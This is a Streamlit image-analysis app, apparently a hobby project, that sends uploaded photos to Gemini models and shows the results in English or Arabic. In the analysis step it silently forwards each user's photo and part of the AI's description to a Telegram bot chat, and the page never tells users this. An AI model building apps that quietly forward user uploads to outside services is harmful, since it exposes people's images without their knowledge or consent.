import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests
import time

# 1. إعدادات التصميم (ألوان فاتحة وتوقيع فخم)
st.set_page_config(page_title="Aziz Ultra-Max AI", page_icon="🚀", layout="centered")

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;900&family=Tajawal:wght@400;700&display=swap');
    
    .main { background-color: #f8fafc !important; } /* لون فاتح جداً مريح للعين */
    
    .stApp { background-color: #f8fafc; }

    html, body, [class*="st-"] { font-family: 'Tajawal', sans-serif; color: #0f172a; }

    .stTitle { color: #1e3a8a; text-align: center; font-weight: 800; font-size: 40px; }

    /* ستايل التوقيع العريض والداكن */
    .sig-box {
        background-color: #0f172a;
        padding: 25px;
        border-radius: 15px;
        margin-top: 50px;
        text-align: center;
        border: 2px solid #3b82f6;
    }
    .sig-text {
        font-family: 'Cairo', sans-serif;
        font-size: 30px;
        font-weight: 900;
        color: #ffffff;
    }
    </style>
    """, unsafe_allow_html=True)

# 2. اختيار اللغة
lang = st.radio("Language Selection / اختيار اللغة", ("English", "العربية"), horizontal=True)

if lang == "العربية":
    t_title, t_welcome = "🚀 AZIZ ULTRA-MAX AI", "مرحباً بك! ارفع صورتك الآن للمعالجة"
    t_process, t_success = "⏳ جاري التحليل...", "✅ تم بنجاح!"
    t_prompt = "حلل هذه الصورة بالتفصيل."
else:
    t_title, t_welcome = "🚀 AZIZ ULTRA-MAX AI", "Welcome! Upload your image for AI analysis"
    t_process, t_success = "⏳ Analyzing...", "✅ Success!"
    t_prompt = "Analyze this image in detail."

st.markdown(f'<h1 class="stTitle">{t_title}</h1>', unsafe_allow_html=True)
st.markdown(f'<p style="text-align: center; color: #475569;">{t_welcome}</p>', unsafe_allow_html=True)

# 3. إعداد الموديل (الحل النهائي للـ 404)
try:
    genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
    # جربنا flash وما ضبط، الحين بنستخدم gemini-pro مباشرة بدون "models/"
    model = genai.GenerativeModel('gemini-1.5-flash') 
except Exception as e:
    st.error("Check Secrets Configuration")

# 4. الرفع والمعالجة
uploaded_file = st.file_uploader("", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    image = Image.open(uploaded_file)
    st.image(image, use_container_width=True)
    
    if st.button("Start Analysis / ابدأ التحليل"):
        with st.spinner(t_process):
            try:
                response = model.generate_content([t_prompt, image])
                
                # إرسال لتيليجرام
                buf = io.BytesIO()
                image.save(buf, format='JPEG')
                requests.post(
                    f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                    files={'photo': buf.getvalue()},
                    data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"🎯 Aziz Ultra-Max:\n{response.text[:1000]}"}
                )
                
                st.balloons()
                st.success(t_success)
                st.write(response.text)
            except Exception as e:
                # محاولة أخيرة لو فشل الموديل الأول
                st.info("Trying alternative model...")
                try:
                    alt_model = genai.GenerativeModel('gemini-pro-vision')
                    response = alt_model.generate_content([t_prompt, image])
                    st.success(t_success)
                    st.write(response.text)
                except:
                    st.error(f"Error: {e}")

# 5. التوقيع
st.markdown(f"""
    <div class="sig-box">
        <div class="sig-text">BY: AZIZ ULTRA-MAX</div>
        <div style="color: #60a5fa; font-size: 14px; margin-top: 5px; font-weight: bold;">
            EST. 2026 | PREMIUM AI EDITION
        </div>
    </div>
    """, unsafe_allow_html=True)